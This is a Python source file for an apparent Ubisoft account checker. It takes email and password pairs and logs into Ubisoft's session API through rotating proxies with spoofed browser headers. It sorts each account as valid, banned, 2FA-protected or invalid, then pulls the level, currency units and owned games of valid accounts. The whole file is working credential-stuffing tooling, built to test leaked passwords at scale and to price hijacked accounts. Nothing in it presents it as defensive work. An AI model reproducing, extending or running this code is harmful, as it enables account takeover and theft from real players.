import requests
import json
import base64
import time
import random
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from concurrent.futures import ThreadPoolExecutor

class UbisoftChecker:
    _app_names_cache = {}
    _session_pool = None
    _max_workers = 10

    @classmethod
    def init_session_pool(cls):
        if cls._session_pool is None:
            cls._session_pool = ThreadPoolExecutor(max_workers=cls._max_workers)

    def __init__(self, email, password):
        self.username = email
        self.password = password
        self.session = self._create_session()
        
        self.proxies = [
            "USER:PASS@IP:PORT",
            "USER:PASS@IP:PORT",
            "USER:PASS@IP:PORT"
        ]
        self.set_random_proxy()
        UbisoftChecker.init_session_pool()

    def _create_session(self):
        session = requests.Session()
        
        retry_strategy = Retry(
            total=3,
            backoff_factor=0.5,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=20, pool_maxsize=20)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        return session
        
    def set_random_proxy(self):
        proxy = random.choice(self.proxies)
        proxy_parts = proxy.split(':')
        host = proxy_parts[0]
        port = proxy_parts[1]
        username = proxy_parts[2]
        password = proxy_parts[3]
        
        formatted_proxy = {
            'http': f'http://{username}:{password}@{host}:{port}',
            'https': f'http://{username}:{password}@{host}:{port}'
        }
        self.session.proxies.update(formatted_proxy)

    def _fetch_game_names(self, app_ids, headers):
        uncached_app_ids = [app_id for app_id in app_ids if app_id not in self._app_names_cache]
        
        if not uncached_app_ids:
            return [self._app_names_cache[app_id] for app_id in app_ids if app_id in self._app_names_cache]
            
        batch_size = 50
        games = []
        
        for i in range(0, len(uncached_app_ids), batch_size):
            batch = uncached_app_ids[i:i + batch_size]
            app_ids_str = ",".join(batch)
            
            try:
                response = self.session.get(
                    f"https://public-ubiservices.ubi.com/v1/applications?applicationIds={app_ids_str}&offset=0&limit={batch_size}",
                    headers=headers,
                    timeout=30
                )
                apps_response = response.json()
                
                if isinstance(apps_response, dict) and "applications" in apps_response:
                    for app in apps_response["applications"]:
                        if app.get("applicationId") and app.get("name"):
                            self._app_names_cache[app["applicationId"]] = app["name"]
                            games.append(app["name"])
                elif isinstance(apps_response, list):
                    for app in apps_response:
                        if app.get("applicationId") and app.get("name"):
                            self._app_names_cache[app["applicationId"]] = app["name"]
                            games.append(app["name"])
                            
            except Exception:
                continue
                
        games.extend([self._app_names_cache[app_id] for app_id in app_ids if app_id in self._app_names_cache])
        
        return list(set(filter(None, games)))
        
    def check_account(self, max_retries=3):
        try:
            retry_count = 0
            while retry_count < max_retries:
                try:
                    self.set_random_proxy()
                    
                    credentials = f"{self.username}:{self.password}"
                    auth_token = base64.b64encode(credentials.encode()).decode()
                    
                    headers = {
                        "accept": "application/json",
                        "accept-encoding": "gzip, deflate, br, zstd",
                        "accept-language": "en-US,en;q=0.9",
                        "authorization": f"Basic {auth_token}",
                        "content-type": "application/json",
                        "genomeid": "42d07c95-9914-4450-8b38-267c4e462b21",
                        "origin": "https://connect.ubisoft.com",
                        "priority": "u=1, i",
                        "referer": "https://connect.ubisoft.com/",
                        "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                        "sec-ch-ua-mobile": "?0",
                        "sec-ch-ua-platform": '"Windows"',
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "cross-site",
                        "ubi-appid": "82b650c0-6cb3-40c0-9f41-25a53b62b206",
                        "ubi-requestedplatformtype": "uplay",
                        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
                    }
                    
                    data = {"rememberMe": True}
                    
                    response = self.session.post(
                        "https://public-ubiservices.ubi.com/v3/profiles/sessions",
                        headers=headers,
                        json=data,
                        timeout=30
                    )
                    
                    if response.status_code == 409:
                        self.session = self._create_session()
                        retry_count += 1
                        if retry_count < max_retries:
                            time.sleep(random.uniform(1, 2))
                            continue
                        else:
                            return {"status": "FAILURE", "message": "Max retries reached due to session conflicts"}
                    
                    if response.status_code != 200:
                        return {"status": "FAILURE", "message": f"Authentication failed with status code: {response.status_code}"}
                    
                    result = response.json()
                    
                    if any(msg in response.text for msg in [
                        "Email format is invalid.",
                        "Invalid credentials",
                        "Password is required"
                    ]):
                        return {"status": "FAILURE", "message": "Invalid credentials"}
                        
                    if "Ubi-Challenge header is required for action 'BasicAuthentication" in response.text:
                        return {"status": "BAN", "message": "Account banned"}
                        
                    if '"rememberMeTicket":null,' in response.text:
                        return {"status": "2FACTOR", "message": "2FA required"}
                        
                    if "userId" not in response.text:
                        return {"status": "FAILURE", "message": "Unknown error"}
                    
                    ticket = result.get("ticket")
                    username = result.get("nameOnPlatform", "")
                    profile_id = result.get("profileId")
                    session_id = result.get("sessionId")
                    
                    if not all([ticket, profile_id, session_id]):
                        return {"status": "FAILURE", "message": "Missing required tokens"}
                    
                    headers.update({
                        "authorization": f"Ubi_v1 t={ticket}",
                        "ubi-appid": "314d4fef-e568-454a-ae06-43e3bece12a6",
                        "ubi-sessionid": session_id
                    })
                    
                    with ThreadPoolExecutor(max_workers=3) as executor:
                        futures = {
                            'progression': executor.submit(
                                self.session.get,
                                "https://public-ubiservices.ubi.com/v1/profiles/me/global/ubiconnect/economy/api/metaprogression",
                                headers=headers
                            ),
                            'units': executor.submit(
                                self.session.get,
                                f"https://public-ubiservices.ubi.com/v1/profiles/{profile_id}/global/ubiconnect/economy/api/units",
                                headers=headers
                            ),
                            'games': executor.submit(
                                self.session.get,
                                "https://public-ubiservices.ubi.com/v1/profiles/me/gamesplayed",
                                headers=headers
                            )
                        }
                        
                        progression = futures['progression'].result().json()
                        units_response = futures['units'].result().json()
                        games_response = futures['games'].result().json()
                    
                    level = progression.get("level", 0)
                    exp = progression.get("xp", 0)
                    units = units_response.get("units", 0)
                    
                    app_ids = []
                    if isinstance(games_response, dict) and "gamesPlayed" in games_response:
                        for game in games_response["gamesPlayed"]:
                            if "applications" in game:
                                for app in game["applications"]:
                                    if app.get("applicationId"):
                                        app_ids.append(app["applicationId"])
                    
                    games = []
                    if app_ids:
                        app_ids = list(set(app_ids))
                        games = self._fetch_game_names(app_ids, headers)
                    
                    status = "SUCCESS"
                    if units == 0 and level == 0 and not games:
                        status = "CUSTOM"
                    
                    result = {
                        "status": status,
                        "username": username,
                        "level": level,
                        "exp": exp,
                        "units": units,
                        "games": games
                    }
                    
                    return result
                    
                except requests.RequestException as e:
                    return {"status": "FAILURE", "message": f"Network error: {str(e)}"}
                except Exception as e:
                    return {"status": "FAILURE", "message": f"Error: {str(e)}"}
            
        except Exception as e:
            return {"status": "FAILURE", "message": f"Error: {str(e)}"} 